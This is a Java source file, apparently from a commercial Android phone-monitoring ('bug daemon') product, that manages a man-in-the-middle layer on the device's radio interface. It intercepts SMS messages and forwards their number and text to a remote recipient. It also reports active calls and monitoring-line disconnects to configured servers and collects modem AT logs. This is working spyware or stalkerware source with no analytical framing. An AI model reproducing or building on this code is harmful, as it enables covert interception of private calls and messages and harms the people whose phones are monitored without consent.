package com.vvt.callmanager.mitm;

import java.io.IOException;
import java.util.HashSet;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;

import com.fx.daemon.util.SyncWait;
import com.vvt.callmanager.CallMgrPreference;
import com.vvt.callmanager.Mitm;
import com.vvt.callmanager.filter.FilterFactory;
import com.vvt.callmanager.filter.InterceptingFilter;
import com.vvt.callmanager.filter.InterceptingFilter.OnFilterSetupCompleteListener;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.BugDaemonResource;
import com.vvt.callmanager.ref.BugNotification;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.ref.InterceptingSms;
import com.vvt.callmanager.ref.MonitorDisconnectData;
import com.vvt.callmanager.ref.SmsInterceptInfo;
import com.vvt.callmanager.ref.command.RemoteForwardInterceptingSms;
import com.vvt.callmanager.ref.command.RemoteNotifyOnCallActive;
import com.vvt.callmanager.ref.command.RemoteNotifyOnMonitorDisconnect;
import com.vvt.callmanager.ref.command.RemoteResetMitm;
import com.vvt.callmanager.std.RilManager;
import com.vvt.callmanager.std.SmsInfo;
import com.vvt.ioutil.Persister;
import com.vvt.logger.FxLog;
import com.vvt.network.NetworkServiceInfo;
import com.vvt.network.NetworkServiceMonitoring;
import com.vvt.network.NetworkServiceMonitoring.OnNetworkChangeListener;

public class MitmManager implements 
		OnNetworkChangeListener, 
		CallIntercept.Listener, 
		SmsIntercept.Listener {
	
	private enum FilterType { FILTER_CALL, FILTER_SMS };
	
	private static final String TAG = "MitmManager";
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final int FILTER_SETUP_FAIL_PERIOD = 10*1000;
	
	private static MitmManager sInstance;
	
	private AtLogCollector mSmsAtLogCollector;
	private AtLogCollector mCallAtLogCollector;
	private Context mContext;
	private Mitm mMitm;
	private OnFilterSetupCompleteListener mFilterCallSetupListener;
	private OnFilterSetupCompleteListener mFilterSmsSetupListener;
	private Timer mFilterCallTimer;
	private Timer mFilterSmsTimer;
	private TimerTask mFilterCallTimerTask;
	private TimerTask mFilterSmsTimerTask;
	
	public static MitmManager getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new MitmManager(context);
		}
		return sInstance;
	}

	private MitmManager(Context context) {
		mContext = context;
		mMitm = Mitm.getInstance(mContext);
	}
	
	public void setupMitm() {
		if (LOGD) FxLog.d(TAG, "setupMitm # ENTER ...");
		
		if (LOGD) FxLog.d(TAG, "setupMitm # Start MITM setup waiting thread");
		SyncWait syncWait = new SyncWait();
		MitmSetupWaitingThread mitmSetupWaiting = new MitmSetupWaitingThread(mContext, syncWait);
		mitmSetupWaiting.start();
		
		if (LOGD) FxLog.d(TAG, "setupMitm # Begin MITM setup");
		mMitm.setup();
		
		if (LOGD) FxLog.d(TAG, "setupMitm # Setup operation is in progress ...");
		syncWait.getReady();
		
		if (LOGD) FxLog.d(TAG, "setupMitm # Initialize filters");
		NetworkServiceMonitoring networkMonitoring = new NetworkServiceMonitoring(mContext, this);
		updateFilters(networkMonitoring.getCurrentNetworkInfo());
		
		if (LOGD) FxLog.d(TAG, "setupMitm # Start network monitoring");
		networkMonitoring.start();
		
		if (LOGD) FxLog.d(TAG, "setupMitm # Setup operation is completed");
		
		if (LOGD) FxLog.d(TAG, "setupMitm # EXIT ...");
	}

	@Override
	public void onNormalCallActive(ActiveCallInfo callInfo) {
		if (LOGD) FxLog.d(TAG, String.format("onCallActive: %s", callInfo));
		
		CallMgrPreference pref = CallMgrPreference.getInstance();
		HashSet<BugNotification> notifications = pref.getBugNotifications();
		
		RemoteNotifyOnCallActive remoteNotify = null;
		try {
			for (BugNotification notification : notifications) {
				
				boolean isListening = notification.isListening(
						BugNotification.LISTEN_ON_NORMAL_CALL_ACTIVE);
				
				if (isListening && notification.getServerName() != null) {
					remoteNotify = new RemoteNotifyOnCallActive(
							callInfo, notification.getServerName());
					remoteNotify.execute();
				}
				else {
					if (LOGW) FxLog.w(TAG, "onNormalCallActive # No server name specified");
				}
			}
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("onNormalCallActive # Error: %s", e));
		}
	}

	@Override
	public void onMonitorDisconnect(MonitorDisconnectData data) {
		if (LOGD) FxLog.d(TAG, String.format("onMonitorDisconnect: %s", data));
		
		CallMgrPreference pref = CallMgrPreference.getInstance();
		HashSet<BugNotification> notifications = pref.getBugNotifications();
		
		RemoteNotifyOnMonitorDisconnect remoteNotify = null;
		try {
			for (BugNotification notification : notifications) {
				boolean isListening = notification.isListening(
						BugNotification.LISTEN_ON_MONITOR_DISCONNECT);
				
				if (isListening && notification.getServerName() != null) {
					remoteNotify = new RemoteNotifyOnMonitorDisconnect(
							data, notification.getServerName());
					
					remoteNotify.execute();
				}
				else {
					if (LOGW) FxLog.w(TAG, "onMonitorDisconnect # No server name specified");
				}
			}
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("onMonitorDisconnect # Error: %s", e));
		}
	}

	@Override
	public void onSmsIntercept(SmsInterceptInfo interceptInfo, SmsInfo smsInfo) {
		String recipient = interceptInfo.getClientSocketName();
		
		if (LOGD) FxLog.d(TAG, String.format(
				"onSmsIntercept # recipient: %s, info: %s", recipient, smsInfo));
		
		boolean isSuccess = false;
		try {
			InterceptingSms interceptSms = new InterceptingSms();
			interceptSms.setNumber(smsInfo.getPhoneNumber());
			interceptSms.setMessage(smsInfo.getMessageBody());
			
			RemoteForwardInterceptingSms remoteForwarding = 
					new RemoteForwardInterceptingSms(interceptSms, recipient);
			
			isSuccess = remoteForwarding.execute();
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("onSmsIntercept # Error: %s", e));
		}
		
		if (isSuccess) {
			if (LOGD) FxLog.d(TAG, "onSmsIntercept # Forwarding success");
		}
		else {
			if (LOGD) FxLog.d(TAG, "onSmsIntercept # Forwarding failed!!");
		}
		
	}

	@Override
	public void onNetworkChange(NetworkServiceInfo networkInfo) {
		if (LOGD) FxLog.d(TAG, "onNetworkChange # ENTER ...");
		
		updateFilters(networkInfo);
		
		if (LOGD) FxLog.d(TAG, "onNetworkChange # EXIT ...");
	}
	
	private void updateFilters(NetworkServiceInfo networkInfo) {
		if (LOGD) FxLog.d(TAG, "updateFilters # ENTER ...");
		if (LOGD) FxLog.d(TAG, String.format("updateFilters # Network Info: %s", networkInfo));
		
		if (LOGD) FxLog.d(TAG, "updateFilters # Remove all filters");
		mMitm.removeAllFilters();
		
		// Add filters if service state is active
		if (networkInfo.getState() == NetworkServiceInfo.State.ACTIVE) {
			
			// This logic is trying to solve unknown network type that rarely occur in some devices. 
			NetworkServiceInfo.Type networkType = networkInfo.getType();
			if (networkType == NetworkServiceInfo.Type.UNKNOWN) {
				networkType = getStoredNetworkType();
				if (LOGW) FxLog.w(TAG, String.format(
						"updateFilters # Use stored network type: %s", networkType));
			}
			else {
				updateStoredNetworkType(networkType);
			}
			
			if (Customization.ENABLE_FILTER_SMS) {
				RilManager smsRilManager = new RilManager(
						FilterFactory.TAG_FILTER_SMS, 
						Customization.SHOW_ATLOG_SMS, 
						Customization.COLLECT_ATLOG_SMS);
				
				if (Customization.COLLECT_ATLOG_SMS) {
					if (mSmsAtLogCollector == null) {
						mSmsAtLogCollector = 
								new AtLogCollector(
										BugDaemonResource.AT_LOG_SMS_PATH);
						mSmsAtLogCollector.setTimerDurationMs(5000);
					}
					mSmsAtLogCollector.start();
					smsRilManager.setAtLogCollector(mSmsAtLogCollector);
				}
				
				InterceptingFilter filterSms = 
						FilterFactory.getFilterSms(mContext, mMitm, smsRilManager);
				
				if (filterSms != null) {
					startFilterSetupMonitoring(filterSms);
					if (filterSms instanceof SmsIntercept) {
						((SmsIntercept) filterSms).setInterceptListener(this);
					}
					
					mMitm.addFilter(filterSms);
					filterSms.sendSampleMessage();
					if (LOGD) FxLog.d(TAG, "updateFilters # Sms filter is added");
				}
			}
			
			if (Customization.ENABLE_FILTER_CALL) {
				RilManager callRilManager = new RilManager(
						FilterFactory.TAG_FILTER_CALL, 
						Customization.SHOW_ATLOG_CALL, 
						Customization.COLLECT_ATLOG_CALL);
				
				if (Customization.COLLECT_ATLOG_CALL) {
					if (mCallAtLogCollector == null) {
						mCallAtLogCollector = 
								new AtLogCollector(
										BugDaemonResource.AT_LOG_CALL_PATH);
						mCallAtLogCollector.setTimerDurationMs(5000);
					}
					mCallAtLogCollector.start();
					callRilManager.setAtLogCollector(mCallAtLogCollector);
				}
				
				InterceptingFilter filterCall = 
						FilterFactory.getFilterCall(
								networkType, mContext, mMitm, callRilManager);
				
				if (filterCall != null) {
					startFilterSetupMonitoring(filterCall);
					if (filterCall instanceof CallIntercept) {
						((CallIntercept) filterCall).setInterceptListener(this);
					}
					
					mMitm.addFilter(filterCall);
					filterCall.sendSampleMessage();
					if (LOGD) FxLog.d(TAG, "updateFilters # Call filter is added");
				}
			}
		}
		// Stop Log Collector when state is inactive
		else {
			if (mSmsAtLogCollector != null) {
				mSmsAtLogCollector.stop();
			}
			if (mCallAtLogCollector != null) {
				mCallAtLogCollector.stop();
			}
		}
		
		if (LOGD) FxLog.d(TAG, "updateFilters # EXIT ...");
	}
	
	private void updateStoredNetworkType(NetworkServiceInfo.Type networkType) {
		boolean isPersisted = Persister.persistObject(
				networkType, BugDaemonResource.PERSISTED_NETWORK_TYPE_PATH);
		if (!isPersisted) {
			if (LOGW) FxLog.w(TAG, "updateStoredNetworkType # Persisting failed!");
		}
	}
	
	private NetworkServiceInfo.Type getStoredNetworkType() {
		NetworkServiceInfo.Type networkType = NetworkServiceInfo.Type.UNKNOWN;
		Object obj = Persister.deserializeToObject(
				BugDaemonResource.PERSISTED_NETWORK_TYPE_PATH);
		if (obj instanceof NetworkServiceInfo.Type) {
			networkType = (NetworkServiceInfo.Type) obj;
		}
		return networkType;
	}
	
	private void startFilterSetupMonitoring(InterceptingFilter filter) {
		if (filter instanceof SmsIntercept) {
			if (mFilterSmsTimerTask != null) mFilterSmsTimerTask.cancel();
			if (mFilterSmsTimer != null) mFilterSmsTimer.cancel();
			
			mFilterSmsTimerTask = getFilterSetupFailTask();
			mFilterSmsTimer = new Timer();
			mFilterSmsTimer.schedule(mFilterSmsTimerTask, FILTER_SETUP_FAIL_PERIOD);
			mFilterSmsSetupListener = getOnFilterSetupCompleteListener(FilterType.FILTER_SMS);
			filter.setOnFirstMessageReceiveListener(mFilterSmsSetupListener);
		}
		else if (filter instanceof CallIntercept) {
			if (mFilterCallTimerTask != null) mFilterCallTimerTask.cancel();
			if (mFilterCallTimer != null) mFilterCallTimer.cancel();
			
			mFilterCallTimerTask = getFilterSetupFailTask();
			mFilterCallTimer = new Timer();
			mFilterCallTimer.schedule(mFilterCallTimerTask, FILTER_SETUP_FAIL_PERIOD);
			mFilterCallSetupListener = getOnFilterSetupCompleteListener(FilterType.FILTER_CALL);
			filter.setOnFirstMessageReceiveListener(mFilterCallSetupListener);
		}
	}

	private void receiveOnFilterSetupComplete(FilterType filterType) {
		if (filterType == FilterType.FILTER_SMS) {
			if (mFilterSmsTimerTask != null) {
				mFilterSmsTimerTask.cancel();
				mFilterSmsTimerTask = null;
			}
			if (mFilterSmsTimer != null) {
				mFilterSmsTimer.cancel();
				mFilterSmsTimer = null;
			}
			if (LOGD) FxLog.d(TAG, "Sms filter setup complete");
		}
		else if (filterType == FilterType.FILTER_CALL) {
			if (mFilterCallTimerTask != null) {
				mFilterCallTimerTask.cancel();
				mFilterCallTimerTask = null;
			}
			if (mFilterCallTimer != null) {
				mFilterCallTimer.cancel();
				mFilterCallTimer = null;
			}
			if (LOGD) FxLog.d(TAG, "Call filter setup complete");
		}
	}

	private void handleFilterSetupFail() {
		if (LOGE) FxLog.e(TAG, "handleFilterSetupFail # Request reset MITM");
		cancelAllTimer();
		
		RemoteResetMitm remoteCommand = new RemoteResetMitm();
		try {
			remoteCommand.execute();
		}
		catch (IOException e) {
			if (LOGE) FxLog.e(TAG, String.format("handleFilterSetupFail # Error: %s", e));
		}
	}
	
	private TimerTask getFilterSetupFailTask() {
		return new TimerTask() {
			@Override
			public void run() {
				handleFilterSetupFail();
			}
		};
	}
	
	private OnFilterSetupCompleteListener getOnFilterSetupCompleteListener(final FilterType type) {
		return new OnFilterSetupCompleteListener() {
			@Override
			public void onFilterSetupComplete() {
				receiveOnFilterSetupComplete(type);
			}
		};
	}
	
	private void cancelAllTimer() {
		if (mFilterSmsTimerTask != null) {
			mFilterSmsTimerTask.cancel();
			mFilterSmsTimerTask = null;
		}
		if (mFilterSmsTimer != null) {
			mFilterSmsTimer.cancel();
			mFilterSmsTimer = null;
		}
		if (mFilterCallTimerTask != null) {
			mFilterCallTimerTask.cancel();
			mFilterCallTimerTask = null;
		}
		if (mFilterCallTimer != null) {
			mFilterCallTimer.cancel();
			mFilterCallTimer = null;
		}
	}
	
}
